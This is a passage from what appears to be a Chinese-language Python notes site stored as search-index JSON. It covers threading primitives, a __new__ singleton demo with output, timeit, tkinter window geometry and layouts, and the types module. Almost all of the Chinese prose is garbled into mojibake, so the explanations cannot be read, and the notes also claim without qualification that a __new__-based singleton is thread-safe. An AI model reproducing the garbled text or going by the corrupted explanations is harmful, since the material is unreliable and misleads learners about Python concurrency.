é‚£ä¹ˆå­çº¿ç¨‹ä¹Ÿé€€å‡º(è‹¥éœ€è¦ç­‰å¾…åˆ™ä½¿ç”¨join) is_alive() çº¿ç¨‹æ˜¯å¦å­˜æ´»ï¼Œè¿”å›Trueæˆ–è€…Falseã€‚ åœ¨çº¿ç¨‹çš„run()è¿è¡Œä¹‹åç›´åˆ°run()ç»“æŸï¼Œè¯¥æ–¹æ³•è¿”å›Trueã€‚ threading.Condition(lock=None) ä¸€ä¸ªæ¡ä»¶å˜é‡å¯¹è±¡å…è®¸ä¸€ä¸ªæˆ–å¤šä¸ªçº¿ç¨‹ç­‰å¾…ï¼Œç›´åˆ°è¢«å¦ä¸€ä¸ªçº¿ç¨‹é€šçŸ¥ã€‚ lockå‚æ•°å¿…é¡»æ˜¯ä¸€ä¸ªLockå¯¹è±¡æˆ–è€…RLockå¯¹è±¡ï¼Œ å¹¶ä¸”ä¼šä½œä¸ºåº•å±‚é”ä½¿ç”¨ï¼Œé»˜è®¤ä½¿ç”¨RLockã€‚ acquire(*args) è¯·æ±‚åº•å±‚é”ã€‚æ­¤æ–¹æ³•è°ƒç”¨åº•å±‚é”å¯¹åº”çš„æ–¹æ³•å’Œè¿”å›å¯¹åº”æ–¹æ³•çš„è¿”å›å€¼ã€‚ release() é‡Šæ”¾åº•å±‚é”ã€‚æ­¤æ–¹æ³•è°ƒç”¨åº•å±‚æ‰€å¯¹åº”çš„æ–¹æ³•ï¼Œæ²¡æœ‰è¿”å›å€¼ã€‚ wait(timeout=None) é‡Šæ”¾é”ï¼Œç­‰å¾…ç›´åˆ°è¢«é€šçŸ¥ï¼ˆå†è·å–é”ï¼‰æˆ–è€…å‘ç”Ÿè¶…æ—¶äº‹ä»¶ã€‚ å¦‚æœçº¿ç¨‹åœ¨è°ƒç”¨æ­¤æ–¹æ³•æ—¶æœ¬èº«å¹¶æ²¡æœ‰é”ï¼ˆå³çº¿ç¨‹é¦–å…ˆå¾—æœ‰é”ï¼‰ï¼Œ åˆ™ä¼šæŠ¥RuntimeErroré”™è¯¯ã€‚è¿™ä¸ªæ–¹æ³•é‡Šæ”¾åº•å±‚é”ï¼Œç„¶åé˜»å¡çº¿ç¨‹ï¼Œ ç›´åˆ°å¦ä¸€ä¸ªçº¿ç¨‹ä¸­çš„åŒä¸€ä¸ªæ¡ä»¶å˜é‡ä½¿ç”¨notify()æˆ–notify_all()å”¤é†’ï¼Œ æˆ–è€…è¶…æ—¶äº‹ä»¶å‘ç”Ÿï¼Œä¸€æ—¦è¢«å”¤é†’æˆ–è€…è¶…æ—¶ï¼Œ åˆ™ä¼šé‡æ–°å»è·å–é”å¹¶è¿”å›ï¼ˆæˆåŠŸè¿”å›Trueï¼Œå¦åˆ™è¿”å›Falseï¼‰ã€‚ timeoutå‚æ•°ä¸ºæµ®ç‚¹ç±»å‹çš„ç§’æ•°ã€‚ åœ¨RLockä¸­ä½¿ç”¨ä¸€æ¬¡releaseæ–¹æ³•ï¼Œå¯èƒ½å¹¶ä¸èƒ½é‡Šæ”¾é”ï¼Œ å› ä¸ºé”å¯èƒ½è¢«acquire()äº†å¤šæ¬¡ï¼Œä½†æ˜¯åœ¨æ¡ä»¶å˜é‡å¯¹è±¡ä¸­ï¼Œ å®ƒè°ƒç”¨äº†RLockç±»çš„å†…éƒ¨æ–¹æ³•ï¼Œå¯ä»¥ä¸€æ¬¡å°±å®Œå…¨é‡Šæ”¾é”ï¼Œ é‡æ–°è·å–é”æ—¶ä¹Ÿä¼šé‡ç½®é”çš„é€’å½’ç­‰çº§ã€‚ wait_for(predicate, timeout=None) ä¸waitæ–¹æ³•ç›¸ä¼¼ï¼Œç­‰å¾…ï¼Œç›´åˆ°æ¡ä»¶è®¡ç®—ä¸ºTrueï¼Œ è¿”å›æœ€åä¸€æ¬¡çš„predicateçš„è¿”å›å€¼ã€‚ predicateå‚æ•°ä¸ºä¸€ä¸ªè¿”å›å€¼ä¸ºå¸ƒå°”å€¼çš„å¯è°ƒç”¨å¯¹è±¡ã€‚ è°ƒç”¨æ­¤æ–¹æ³•çš„æ—¶å€™ä¼šå…ˆè°ƒç”¨predicateå¯¹è±¡ï¼Œ å¦‚æœè¿”å›çš„å°±æ˜¯Trueï¼Œåˆ™ä¸ä¼šé‡Šæ”¾é”ï¼Œç›´æ¥å¾€åæ‰§è¡Œã€‚ å¦ä¸€ä¸ªçº¿ç¨‹é€šçŸ¥åï¼Œåœ¨å®ƒé‡Šæ”¾é”æ—¶ï¼Œ æ‰ä¼šè§¦å‘wait_foræ–¹æ³•ç­‰å¾…äº‹ä»¶ï¼Œ è¿™æ—¶å¦‚æœpredicateç»“æœä¸ºTrueï¼Œåˆ™å°è¯•è·å–é”ï¼Œ è·å–æˆåŠŸååˆ™ç»§ç»­å¾€åæ‰§è¡Œï¼Œ å¦‚æœä¸ºFalseï¼Œåˆ™ä¼šä¸€ç›´é˜»å¡ä¸‹å»ã€‚æ­¤æ–¹æ³•å¦‚æœå¿½ç•¥timeoutå‚æ•°ï¼Œ å°±ç›¸å½“äºï¼šwhile not predicate(): condition_lock.wait()ã€‚ notify(n=1) å”¤é†’ä¸€ä¸ªç­‰å¾…è¿™ä¸ªæ¡ä»¶çš„çº¿ç¨‹ï¼Œ å¦‚æœè°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„çº¿ç¨‹åœ¨æ²¡æœ‰è·å¾—é”çš„æƒ…å†µä¸‹è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œ ä¼šæŠ¥RuntimeErroré”™è¯¯ã€‚ é»˜è®¤å”¤é†’ä¸€ä¸ªçº¿ç¨‹ï¼Œå¯ä»¥é€šè¿‡å‚æ•°nè®¾ç½®å”¤é†’nä¸ªæ­£åœ¨ç­‰å¾…è¿™ä¸ªæ¡ä»¶å˜é‡çš„çº¿ç¨‹ï¼Œ å¦‚æœæ²¡æœ‰çº¿ç¨‹åœ¨ç­‰å¾…ï¼Œè°ƒç”¨è¿™ä¸ªæ–¹æ³•ä¸ä¼šå‘ç”Ÿä»»ä½•äº‹ã€‚ å¦‚æœç­‰å¾…çš„çº¿ç¨‹ä¸­æ­£å¥½æœ‰nä¸ªçº¿ç¨‹ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•å¯ä»¥å‡†ç¡®çš„å”¤é†’è¿™nä¸ªçº¿ç¨‹ï¼Œ ä½†æ˜¯ç­‰å¾…çš„çº¿ç¨‹è¶…è¿‡æŒ‡å®šçš„nä¸ªï¼Œæœ‰æ—¶å€™å¯èƒ½ä¼šå”¤é†’è¶…è¿‡nä¸ªçš„çº¿ç¨‹ï¼Œ æ‰€ä»¥ä¾èµ–å‚æ•°næ˜¯ä¸å®‰å…¨çš„è¡Œä¸ºã€‚ notify_all() å”¤é†’æ‰€æœ‰ç­‰å¾…è¿™ä¸ªæ¡ä»¶çš„çº¿ç¨‹ã€‚ è¿™ä¸ªæ–¹æ³•ä¸notify()ä¸åŒä¹‹å¤„åœ¨äºå®ƒå”¤é†’æ‰€æœ‰çº¿ç¨‹ï¼Œè€Œä¸æ˜¯ç‰¹å®šnä¸ªã€‚ é»˜è®¤ä¸ºFalse(æ¢è€Œè¨€ä¹‹, é»˜è®¤, ä¸»çº¿ç¨‹,å­çº¿ç¨‹äº’ä¸å½±å“) åŒæ—¶ä¸ªäººå»ºè®®è®¾ç½®ä¸ºTrue, å¯ä»¥ä¿è¯å¯¹å­çº¿ç¨‹çš„æ§åˆ¶æƒ, å¦åˆ™å¯èƒ½ä¼šå‡ºç°, ä¸»çº¿ç¨‹ç»“æŸå, å­çº¿ç¨‹æˆä¸ºå­¤å„¿è¿›ç¨‹, è¢«æ‰˜ç®¡ç»™ç³»ç»Ÿçš„initè¿›ç¨‹, ç›´åˆ°å®Œæˆåè¢«å›æ”¶ å…¶ä»–å˜é‡: name çº¿ç¨‹çš„åç§°å­—ç¬¦ä¸²ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆå®é™…å«ä¹‰ï¼Œå¤šä¸ªçº¿ç¨‹å¯ä»¥èµ‹äºˆç›¸åŒçš„åç§°ï¼Œ åˆå§‹å€¼ç”±åˆå§‹åŒ–æ–¹æ³•æ¥è®¾ç½®ã€‚ ident çº¿ç¨‹çš„æ ‡è¯†ç¬¦ï¼Œå¦‚æœçº¿ç¨‹è¿˜æ²¡æœ‰å¯åŠ¨ï¼Œ åˆ™ä¸ºNoneã€‚identæ˜¯ä¸€ä¸ªéé›¶æ•´æ•°ï¼Œ å‚è§threading.get_ident()å‡½æ•°ã€‚ å½“çº¿ç¨‹ç»“æŸåï¼Œå®ƒçš„identå¯èƒ½è¢«å…¶ä»–æ–°åˆ›å»ºçš„çº¿ç¨‹å¤ç”¨ï¼Œ å½“ç„¶å°±ç®—è¯¥çº¿ç¨‹ç»“æŸäº†ï¼Œå®ƒçš„identä¾æ—§æ˜¯å¯ç”¨çš„ã€‚ daemon è¡¨ç¤ºè¯¥çº¿ç¨‹æ˜¯å¦æ˜¯å®ˆæŠ¤çº¿ç¨‹ï¼ŒTrueæˆ–è€…Falseã€‚è®¾ç½®ä¸€ä¸ªçº¿ç¨‹çš„daemonå¿…é¡»åœ¨çº¿ç¨‹çš„start()æ–¹æ³•ä¹‹å‰ï¼Œå¦åˆ™ä¼šæŠ¥RuntimeErroré”™è¯¯ã€‚è¿™ä¸ªå€¼é»˜è®¤ç»§æ‰¿è‡ªåˆ›å»ºå®ƒçš„çº¿ç¨‹ï¼Œä¸»çº¿ç¨‹é»˜è®¤æ˜¯éå®ˆæŠ¤çº¿ç¨‹çš„ï¼Œæ‰€ä»¥åœ¨ä¸»çº¿ç¨‹ä¸­åˆ›å»ºçš„çº¿ç¨‹é»˜è®¤éƒ½æ˜¯éå®ˆæŠ¤çº¿ç¨‹çš„ï¼Œå³daemon=Falseã€‚ Lock() äº’æ–¥é” è·å–ä¸€ä¸ªäº’æ–¥é”, ç”¨äºå¤šçº¿ç¨‹æ—¶äº’æ–¥è®¿é—®. ä¸è¿‡ä¼šé™ä½æ•ˆç‡(ç±»ä¼¼å†™æˆäº†å•ä»»åŠ¡) Semaphore() ä¿¡å·é‡Semaphore ä¸ Lock()_ çš„åŒºåˆ«æ˜¯, Semaphore æ”¯æŒåŒæ—¶å¯¹å¤šä¸ªä½¿ç”¨. Semaphore å†…éƒ¨ç»´æŠ¤äº†ä¸€ä¸ªè®¡æ•°å™¨. è·å–é”çš„æ—¶å€™, è®¡æ•°å™¨å‡ä¸€, é‡Šæ”¾é”çš„æ—¶å€™åŠ ä¸€ ä¸€äº›å‘ __new__æ–¹æ³•æ˜¯æ”¯æŒå¤šçº¿ç¨‹çš„ï¼Œ æ‰€ä»¥å¯¹äºä½¿ç”¨__new__å®ç°çš„å•ä¾‹å¯¹è±¡, ä¸å­˜åœ¨å¤šçº¿ç¨‹çš„çº¿ç¨‹å®‰å…¨é—®é¢˜, æ›´è¯¦ç»†çš„è¯´æ˜, çŸ¥è¯†åœ¨ __new__å†…éƒ¨çš„æ“ä½œæ²¡æœ‰çº¿ç¨‹å®‰å…¨é—®é¢˜, å¯ä»¥ä¿è¯å¤šçº¿ç¨‹ç¯å¢ƒä¸‹è¿”å›çš„éƒ½æ˜¯åŒä¸€ä¸ªå¯¹è±¡, ä½†æ˜¯å…¶ä»–æ–¹æ³•, å­˜åœ¨åŒæ—¶è®¿é—®çš„å¯¹è±¡, è¯¥åŠ é”è¿˜æ˜¯è¦åŠ é” class Single(object): \"\"\" single instance, attention son class's __init__ will exec once \"\"\" __instance = None def __new__(cls, *args, **kwargs): if cls.__instance is None: cls.__instance = super().__new__(cls, ) return cls.__instance if __name__ == '__main__': class P(Single): p = 0 # _instance = None # @classmethod # def instance(cls,): # if cls._instance is None: # cls._instance = cls() # return cls._instance def __init__(self): time.sleep(random.randint(0, 5)) def set_p(self): self.p += 1 print(f'p={self.p}', ) def set_p(): time.sleep(random.randint(0, 5)) pp = P() print(pp) pp.set_p() t_list = [] for _ in range(20): t_list.append(threading.Thread(target=set_p)) for t in t_list: t.start() è¾“å‡º(æŸäº›é¡ºåº kennelä¸ä¸€æ ·): <__main__.P object at 0x1107de4c0> p=1 <__main__.P object at 0x1107de4c0><__main__.P object at 0x1107de4c0> p=2 p=3 <__main__.P object at 0x1107de4c0> <__main__.P object at 0x1107de4c0> p=4 p=5 <__main__.P object at 0x1107de4c0> p=6 <__main__.P object at 0x1107de4c0> p=7 <__main__.P object at 0x1107de4c0><__main__.P object at 0x1107de4c0> p=8 <__main__.P object at 0x1107de4c0> p=9 p=10 <__main__.P object at 0x1107de4c0><__main__.P object at 0x1107de4c0> <__main__.P object at 0x1107de4c0> p=11<__main__.P object at 0x1107de4c0> p=12 <__main__.P object at 0x1107de4c0> p=13 p=14 p=15 <__main__.P object at 0x1107de4c0> p=16 <__main__.P object at 0x1107de4c0><__main__.P object at 0x1107de4c0> p=17 p=18 <__main__.P object at 0x1107de4c0> p=19 <__main__.P object at 0x1107de4c0> p=20","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-threading.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-threading.html"},{"title":"timeit","text":"å®˜ç½‘: timeit --- æµ‹é‡å°ä»£ç ç‰‡æ®µçš„æ‰§è¡Œæ—¶é—´ æ­¤æ¨¡å—æä¾›äº†ä¸€ç§ç®€å•çš„æ–¹æ³•æ¥è®¡ç®—ä¸€å°æ®µ Python ä»£ç çš„è€—æ—¶ã€‚ å®ƒæœ‰ å‘½ä»¤è¡Œæ¥å£ ä»¥åŠä¸€ä¸ª å¯è°ƒç”¨ æ–¹æ³•ã€‚ å®ƒé¿å…äº†è®¸å¤šæµ‹é‡æ—¶é—´çš„å¸¸è§é™·é˜±ã€‚ å¦è§ Tim Peter åœ¨ O'Reilly å‡ºç‰ˆçš„ Python Cookbook ç¬¬äºŒç‰ˆä¸­\"ç®—æ³•\"ç« èŠ‚çš„æ¦‚è¿°ã€‚ çœ‹è¯­å¥çš„æ‰§è¡Œæ—¶é—´ å¦‚: print(timeit.timeit('set([x for x in [1, 3, 5]])')) print(timeit.timeit('set(x for x in [1, 3, 5])')) æºç ï¼Œä¸»è¦æœ‰ä¸¤ä¸ªæ–¹æ³•: def timeit(stmt=\"pass\", setup=\"pass\", timer=default_timer, number=default_number, globals=None): \"\"\"Convenience function to create Timer object and call timeit method.\"\"\" return Timer(stmt, setup, timer, globals).timeit(number) def repeat(stmt=\"pass\", setup=\"pass\", timer=default_timer, repeat=default_repeat, number=default_number, globals=None): \"\"\"Convenience function to create Timer object and call repeat method.\"\"\" return Timer(stmt, setup, timer, globals).repeat(repeat, number) å‚æ•°è§£æï¼š stmt statementï¼Œéœ€è¦è®¡ç®—çš„ä»£ç å­—ç¬¦ä¸²ã€‚ï¼ˆæœ¬åœ°æµ‹çš„æ—¶å€™ï¼Œä¸æ”¯æŒå¤–éƒ¨çš„å˜é‡ï¼‰ setup statementçš„å‰ç½®æ‰§è¡Œï¼Œæ¯”å¦‚å¯ä»¥åœ¨è¿™é‡Œimportæˆ–è€…å®šä¹‰å˜é‡ timer é»˜è®¤æ˜¯ default_timer = time.perf_counter ï¼Œä½¿ç”¨çš„è®¡æ—¶å™¨ number æŒ‡å®šæ‰§è¡Œçš„æ¬¡æ•°ï¼Œé»˜è®¤æ˜¯1000000ï¼ˆ3.6çš„æºç é»˜è®¤æ˜¯100wï¼‰ globals æ‰§è¡Œçš„å‘½åç©ºé—´ repeat é‡å¤æ¬¡æ•°ï¼Œ3.6æºç é»˜è®¤æ˜¯3","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-timeit.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-timeit.html"},{"title":"tkinter","text":"geometryçš„ä½œç”¨ è®¾ç½®çª—å£çš„å®½å’Œé«˜ï¼Œå°±ç®—çª—å£å·²ç»é€šè¿‡resizableå‡½æ•°ç¦æ­¢è°ƒæ•´å®½é«˜ï¼› è¿˜å¯ä»¥ç§»åŠ¨çª—å£åœ¨å±å¹•ä¸Šçš„ä½ç½®: root = tk.Tk() # è®¾ç½®ä¸ºç¦æ­¢è°ƒæ•´å®½ã€é«˜ root.resizable(0,0) # å¤§å°è®¾ç½®ä¸º 600 x 600 root.geometry('600x600') ç§»åŠ¨çª—å£ä½ç½®, åŠ å·é£æ ¼, ç¬¬1ä¸ªåŠ å·æ˜¯è·ç¦»å±å¹•å·¦è¾¹çš„å®½ï¼Œ ç¬¬2ä¸ªåŠ å·æ˜¯è·ç¦»å±å¹•é¡¶éƒ¨çš„é«˜, å¯ä¸ºè´Ÿæ•°: root.geometry('+0+0') root.geometry('+300+400') # ä¸ºè´Ÿæ•°ç§»åŠ¨åˆ°å±å¹•å¤–, å¯ä»¥éšè—çª—å£ root.geometry('+-3000+-4000') # ä¹Ÿå¯ä»¥ä¸€èµ·è®¾ç½® root.geometry('300x250+500+240') å‚æ•°ä¸ºNone, è·å–çª—å£ä½ç½®: root.geometry(None) # '300x250+336+55' #### å¸ƒå±€ç®¡ç†å™¨ gridã€packã€place å‚è€ƒ: https://blog.csdn.net/Oh_Python/article/details/124196792 gridè¡¨æ ¼å¸ƒå±€ï¼Œé‡‡ç”¨è¡¨æ ¼ç»“æ„ç»„ç»‡ç»„ä»¶ï¼Œå­ç»„ä»¶çš„ä½ç½®ç”±è¡Œå’Œåˆ—çš„å•å…ƒæ ¼ç¡®å®šï¼Œå¹¶ä¸”å¯ä»¥è·¨è¡Œå’Œè·¨åˆ—ï¼Œä»è€Œå®ç°å¤æ‚çš„å¸ƒå±€ã€‚ packæŒ‰ç…§ç»„ä»¶çš„åˆ›å»ºé¡ºåºå°†å­ç»„ä»¶æ·»åŠ åˆ°çˆ¶ç»„ä»¶ä¸­ï¼ŒæŒ‰ç…§å‚ç›´æˆ–è€…æ°´å¹³çš„æ–¹å‘è‡ªç„¶æ’å¸ƒï¼Œå¦‚æœä¸æŒ‡å®šä»»ä½•é€‰é¡¹ï¼Œé»˜è®¤åœ¨çˆ¶ç»„ä»¶ä¸­è‡ªé¡¶å‘ä¸‹å‚ç›´æ·»åŠ ç»„ä»¶ã€‚packæ˜¯ä»£ç é‡æœ€å°‘ï¼Œæœ€ç®€å•çš„ä¸€ç§ï¼Œå¯ä»¥ç”¨äºå¿«é€Ÿç”Ÿæˆç•Œé¢ã€‚ place å¸ƒå±€ç®¡ç†å™¨å¯ä»¥é€šè¿‡åæ ‡ç²¾ç¡®æ§åˆ¶ç»„ä»¶çš„ä½ç½®ï¼Œé€‚ç”¨äºä¸€äº›å¸ƒå±€æ›´åŠ çµæ´»çš„åœºæ™¯ã€‚ ### other task.cancel() åªèƒ½å–æ¶ˆçŠ¶æ€ä¸º pendingçš„ä»»åŠ¡, å¦åˆ™å°†æ¯«æ— ä½œç”¨","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-tkinter.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-tkinter.html"},{"title":"traceback","text":"å†™å‡ ä¸ªå¸¸ç”¨çš„å§æš‚æ—¶.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-traceback.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-traceback.html"},{"title":"types","text":"types --- åŠ¨æ€ç±»å‹åˆ›å»ºå’Œå†…ç½®ç±»å‹åç§° å®˜ç½‘: https://docs.python.org/zh-cn/3/library/types.html æ­¤æ¨¡å—å®šä¹‰äº†ä¸€äº›å·¥å…·å‡½æ•°ï¼Œç”¨äºååŠ©åŠ¨æ€åˆ›å»ºæ–°çš„ç±»å‹ã€‚ å®ƒè¿˜ä¸ºæŸäº›å¯¹è±¡ç±»å‹å®šä¹‰äº†åç§°ï¼Œè¿™äº›åç§°ç”±æ ‡å‡† Python è§£é‡Šå™¨æ‰€ä½¿ç”¨ï¼Œä½†å¹¶ä¸åƒå†…ç½®çš„ int æˆ– str é‚£æ ·å¯¹å¤–å…¬å¼€ã€‚ æœ€åï¼Œå®ƒè¿˜é¢å¤–æä¾›äº†ä¸€äº›ç±»å‹ç›¸å…³ä½†é‡è¦ç¨‹åº¦ä¸è¶³ä»¥ä½œä¸ºå†…ç½®å¯¹è±¡çš„å·¥å…·ç±»å’Œå‡½æ•°ã€‚ åŠ¨æ€ç±»å‹åˆ›å»º æ ‡å‡†è§£é‡Šå™¨ç±»å‹ æ­¤æ¨¡å—ä¸ºè®¸å¤šç±»å‹æä¾›äº†å®ç° Python è§£é‡Šå™¨æ‰€è¦æ±‚çš„åç§°ã€‚ å®ƒåˆ»æ„åœ°é¿å…äº†åŒ…å«æŸäº›ä»…åœ¨å¤„ç†è¿‡ç¨‹ä¸­å¶ç„¶å‡ºç°çš„ç±»å‹ï¼Œä¾‹å¦‚ listiterator ç±»å‹ã€‚ æ­¤ç§åç§°çš„å…¸å‹åº”ç”¨å¦‚ isinstance() æˆ– issubclass() æ£€æµ‹ã€‚ å¦‚æœä½ è¦å®ä¾‹åŒ–è¿™äº›ç±»å‹ä¸­çš„ä»»ä½•ä¸€ç§ï¼Œè¯·æ³¨æ„å…¶ç­¾ååœ¨ä¸åŒ Python ç‰ˆæœ¬ä¹‹é—´å¯èƒ½å‡ºç°å˜åŒ–ã€‚ ä»¥ä¸‹ç±»å‹æœ‰ç›¸åº”çš„æ ‡å‡†åç§°å®šä¹‰ï¼š types.NoneType None çš„ç±»å‹ã€‚ 3.10 æ–°ç‰ˆåŠŸèƒ½. types.FunctionType . types.LambdaType ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ä»¥åŠç”± lambda è¡¨è¾¾å¼æ‰€åˆ›å»ºå‡½æ•°çš„ç±»å‹ã€‚ å¼•å‘ä¸€ä¸ª å®¡è®¡äº‹ä»¶ function.__new__ï¼Œé™„å¸¦å‚æ•° codeã€‚ æ­¤å®¡è®¡äº‹ä»¶åªä¼šè¢«å‡½æ•°å¯¹è±¡çš„ç›´æ¥å®ä¾‹åŒ–å¼•å‘ï¼Œè€Œä¸ä¼šè¢«æ™®é€šç¼–è¯‘æ‰€å¼•å‘ã€‚ types.GeneratorType generator è¿­ä»£å™¨å¯¹è±¡çš„ç±»å‹ï¼Œç”±ç”Ÿæˆå™¨å‡½æ•°åˆ›å»ºã€‚ types.CoroutineType coroutine å¯¹è±¡çš„ç±»å‹ï¼Œç”± async def å‡½æ•°åˆ›å»ºã€‚ 3.5 æ–°ç‰ˆåŠŸèƒ½. types.AsyncGeneratorType asynchronous generator è¿­ä»£å™¨å¯¹è±¡çš„ç±»å‹ï¼Œç”±å¼‚æ­¥ç”Ÿæˆå™¨å‡½æ•°åˆ›å»ºã€‚ 3.6 æ–°ç‰ˆåŠŸèƒ½. types.CellType å•å…ƒå¯¹è±¡çš„ç±»å‹ï¼šè¿™ç§å¯¹è±¡è¢«ç”¨ä½œå‡½æ•°ä¸­è‡ªç”±å˜é‡çš„å®¹å™¨ã€‚ 3.8 æ–°ç‰ˆåŠŸèƒ½. types.MethodType ç”¨æˆ·è‡ªå®šä¹‰ç±»å®ä¾‹æ–¹æ³•çš„ç±»å‹ã€‚ types.BuiltinFunctionType . types.BuiltinMethodType å†…ç½®å‡½æ•°ä¾‹å¦‚ len() æˆ– sys.exit() ä»¥åŠå†…ç½®ç±»æ–¹æ³•çš„ç±»å‹ã€‚ ï¼ˆè¿™é‡Œæ‰€è¯´çš„\"å†…ç½®\"æ˜¯æŒ‡\"ä»¥ C è¯­è¨€ç¼–å†™\"ã€‚ï¼‰ types.WrapperDescriptorType æŸäº›å†…ç½®æ•°æ®ç±»å‹å’ŒåŸºç±»çš„æ–¹æ³•çš„ç±»å‹ï¼Œä¾‹å¦‚ object.__init__() æˆ– object.__lt__()ã€‚ types.MethodWrapperType æŸäº›å†…ç½®æ•°æ®ç±»å‹å’ŒåŸºç±»çš„ ç»‘å®š æ–¹æ³•çš„ç±»å‹ã€‚ ä¾‹å¦‚ object().__str__ æ‰€å±çš„ç±»å‹ã€‚ types.NotImplementedType NotImplemented çš„ç±»å‹ã€‚ types.MethodDescriptorType æŸäº›å†…ç½®æ•°æ®ç±»å‹æ–¹æ³•ä¾‹å¦‚ str.join() çš„ç±»å‹ã€‚ types.ClassMethodDescriptorType æŸäº›å†…ç½®æ•°æ®ç±»å‹ éç»‘å®š ç±»æ–¹æ³•ä¾‹å¦‚ dict.__dict__['fromkeys'] çš„ç±»å‹ã€‚ class types.ModuleType(name, doc=None) æ¨¡å— çš„ç±»å‹ã€‚ æ„é€ å™¨æ¥å—å¾…åˆ›å»ºæ¨¡å—çš„åç§°å¹¶ä»¥å…¶ docstring ä½œä¸ºå¯é€‰å‚æ•°ã€‚ å¤‡æ³¨: å¦‚æœä½ å¸Œæœ›è®¾ç½®å„ç§ç”±å¯¼å…¥æ§åˆ¶çš„å±æ€§ï¼Œè¯·ä½¿ç”¨ importlib.util.module_from_spec() æ¥åˆ›å»ºä¸€ä¸ªæ–°æ¨¡å—ã€‚ __doc__ æ¨¡å—çš„ docstringã€‚ é»˜è®¤ä¸º Noneã€‚ __loader__ ç”¨äºåŠ è½½æ¨¡å—çš„ loaderã€‚ é»˜è®¤ä¸º Noneã€‚ This attribute is to match importlib.machinery.ModuleSpec. loader as stored in the __spec__ object. æ³¨è§£ æœªæ¥çš„ Python ç‰ˆæœ¬å¯èƒ½ä¼šåœæ­¢é»˜è®¤è®¾ç½®æ­¤å±æ€§ã€‚ ä¸ºäº†é¿å…è¿™ä¸ªæ½œåœ¨å˜åŒ–çš„å½±å“ï¼Œå¦‚æœä½ æ˜ç¡®åœ°éœ€è¦ä½¿ç”¨æ­¤å±æ€§åˆ™æ¨èæ”¹ä» __spec__ å±æ€§è¯»å– æˆ–æ˜¯ä½¿ç”¨ getattr(module, \"__loader__\", None)ã€‚ åœ¨ 3.4 ç‰ˆæ›´æ”¹: é»˜è®¤ä¸º Noneã€‚ ä¹‹å‰è¯¥å±æ€§ä¸ºå¯é€‰é¡¹ã€‚ __name__ æ¨¡å—çš„åç§°ã€‚ åº”å½“èƒ½åŒ¹é… importlib.machinery.ModuleSpec.nameã€‚ __package__ ä¸€ä¸ªæ¨¡å—æ‰€å±çš„ packageã€‚ å¦‚æœæ¨¡å—ä¸ºæœ€é«˜å±‚çº§çš„ï¼ˆå³ä¸æ˜¯ä»»ä½•ç‰¹å®šåŒ…çš„ç»„æˆéƒ¨åˆ†ï¼‰åˆ™è¯¥å±æ€§åº”è®¾ä¸º ''ï¼Œ å¦åˆ™å®ƒåº”è®¾ä¸ºç‰¹å®šåŒ…çš„åç§° (å¦‚æœæ¨¡å—æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªåŒ…åˆ™åç§°å¯ä»¥ä¸º __name__)ã€‚ é»˜è®¤ä¸º Noneã€‚ This attribute is to match importlib.machinery.ModuleSpec.parent as stored in the __spec__ object. æ³¨è§£ æœªæ¥çš„ Python ç‰ˆæœ¬å¯èƒ½åœæ­¢é»˜è®¤è®¾ç½®æ­¤å±æ€§ã€‚ ä¸ºäº†é¿å…è¿™ä¸ªæ½œåœ¨å˜åŒ–çš„å½±å“ï¼Œå¦‚æœä½ æ˜ç¡®åœ°éœ€è¦ä½¿ç”¨æ­¤å±æ€§åˆ™æ¨èæ”¹ä» __spec__ å±æ€§è¯»å–æˆ–æ˜¯ä½¿ç”¨ getattr(module, \"__package__\", None)ã€‚ åœ¨ 3.4 ç‰ˆæ›´æ”¹: é»˜è®¤ä¸º Noneã€‚ ä¹‹å‰è¯¥å±æ€§ä¸ºå¯é€‰é¡¹ã€‚ __spec__ æ¨¡å—çš„å¯¼å…¥ç³»ç»Ÿç›¸å…³çŠ¶æ€çš„è®°å½•ã€‚ åº”å½“æ˜¯ä¸€ä¸ª importlib.machinery.ModuleSpec çš„å®ä¾‹ã€‚ types.EllipsisType Ellipsis çš„ç±»å‹ã€‚ class types.GenericAlias(t_origin, t_args) å½¢å‚åŒ–æ³›å‹ çš„ç±»å‹ï¼Œä¾‹å¦‚ list[int]ã€‚ t_origin åº”å½“æ˜¯ä¸€ä¸ªéå½¢å‚åŒ–çš„æ³›å‹ç±»ï¼Œä¾‹å¦‚ list, tuple æˆ– dictã€‚ t_args åº”å½“æ˜¯ä¸€ä¸ªå½¢å‚åŒ– t_origin çš„ tuple (é•¿åº¦å¯ä»¥ä¸º 1): >>> from types import GenericAlias list[int] == GenericAlias(list, (int,)) True dict[str, int] == GenericAlias(dict, (str, int)) True åœ¨ 3.9.2 ç‰ˆæ›´æ”¹: æ­¤ç±»å‹ç°åœ¨å¯ä»¥è¢«å­ç±»åŒ–ã€‚ class types.UnionType åˆå¹¶ç±»å‹è¡¨è¾¾å¼ çš„ç±»å‹ã€‚ types.FrameType å¸§å¯¹è±¡çš„ç±»å‹ï¼Œä¾‹å¦‚ tb.tb_frame ä¸­çš„å¯¹è±¡ï¼Œå…¶ä¸­ tb æ˜¯ä¸€ä¸ªå›æº¯å¯¹è±¡ã€‚ types.GetSetDescriptorType ä½¿ç”¨ PyGetSetDef åœ¨æ‰©å±•æ¨¡å—ä¸­å®šä¹‰çš„å¯¹è±¡çš„ç±»å‹ï¼Œä¾‹å¦‚ FrameType.f_locals æˆ– array.array.typecodeã€‚ æ­¤ç±»å‹è¢«ç”¨ä½œå¯¹è±¡å±æ€§çš„æè¿°å™¨ï¼›å®ƒçš„ç›®çš„ä¸ property ç±»å‹ç›¸åŒï¼Œä½†ä¸“é—¨é’ˆå¯¹åœ¨æ‰©å±•æ¨¡å—ä¸­å®šä¹‰çš„ç±»ã€‚ types.MemberDescriptorType ä½¿ç”¨ PyMemberDef 